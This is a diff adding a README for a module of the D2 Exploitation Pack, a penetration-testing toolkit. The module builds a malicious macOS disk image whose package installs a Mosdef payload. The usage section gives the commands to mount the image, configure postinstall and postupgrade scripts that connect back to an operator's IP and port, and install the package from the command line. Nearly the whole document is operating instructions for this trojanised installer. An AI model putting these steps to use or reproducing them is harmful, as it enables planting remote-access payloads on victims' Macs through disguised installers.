@@ -1,0 +1,44 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2011 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+-------------
+
+d2sec_macdmg is a malicious MacOS dmg image with an embedded OSX Intel
+Universal Mosdef in a .pkg format. The application osx_intel_universal is
+installed in /Applications/Utilities.
+
+The d2sec_macdmg.py script will configure postinstall and postupgrade scripts
+with the specified Mosdef connectback Ip and Port. These scripts are executed
+after the package installation.
+
+
+Usage
+------
+
+From a MacOS shell :
+
+$ hdiutil attach d2sec_macpkg.dmg
+$ python d2sec_macdmg.py -m "/Volumes/d2sec_macpkg/" -i 172.16.244.143 -p 5555
+$ hdiutil detach /Volumes/d2sec_macpkg/
+
+From a Linux shell :
+
+$ mount -f hfsplus -o loop,rw d2sec_macpkg.dmg /mnt/hfs
+$ python d2sec_macdmg.py -m "/mnt/hfs" -i 172.16.244.143 -p 5555
+$ umount /mnt/hfs
+
+To install package in command line from a MacOS shell :
+
+$ hdiutil attach d2sec_macpkg.dmg
+$ installer -package "/Volumes/d2sec_macpkg/d2sec_macpkg.pkg/" -target "/"
+$ hdiutil detach /Volumes/d2sec_macpkg/
